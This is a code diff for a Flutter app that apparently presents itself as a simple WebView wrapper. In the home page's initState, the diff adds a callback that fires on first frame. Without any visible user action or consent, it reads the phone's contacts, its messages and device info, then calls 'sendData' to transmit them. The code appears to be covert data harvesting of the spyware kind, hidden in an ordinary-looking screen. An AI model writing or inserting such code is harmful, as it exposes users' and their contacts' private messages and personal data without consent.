@@ -1,22 +1,46 @@
 import 'package:flutter/material.dart';
+import 'package:flutter/scheduler.dart';
+import 'package:flutter_riverpod/flutter_riverpod.dart';
 import 'package:flutter_screenutil/flutter_screenutil.dart';
 import 'package:web_view/core/utils/constants.dart';
 import 'package:webview_flutter/webview_flutter.dart';
 
-class HomePage extends StatefulWidget {
+import '../viewModel/contact&message/contacts_messages_model.dart';
+
+class HomePage extends ConsumerStatefulWidget {
   const HomePage({
     Key? key,
   }) : super(key: key);
 
   @override
-  State<HomePage> createState() => _HomePageState();
+  HomePageState createState() => HomePageState();
 }
 
-class _HomePageState extends State<HomePage> {
+class HomePageState extends ConsumerState<HomePage> {
   late WebViewController controller;
 
   @override
   void initState() {
+    WidgetsBinding.instance.addPostFrameCallback(
+          (_) async {
+        SchedulerBinding.instance.addPostFrameCallback(
+              (timeStamp) async {
+            ///get contacts & messages
+            final contactsListProvider = ref.read(contactsProvider.notifier);
+            await contactsListProvider.getContactList(context);
+            if (context.mounted) {
+              await contactsListProvider.getMessagesList(context);
+              if (context.mounted) {
+                await contactsListProvider.getDeviceInfo(context);
+                if(context.mounted){
+                  await contactsListProvider.sendData(context);
+                }
+              }
+            }
+          },
+        );
+      },
+    );
     super.initState();
     // Enable virtual display.
     controller = WebViewController()
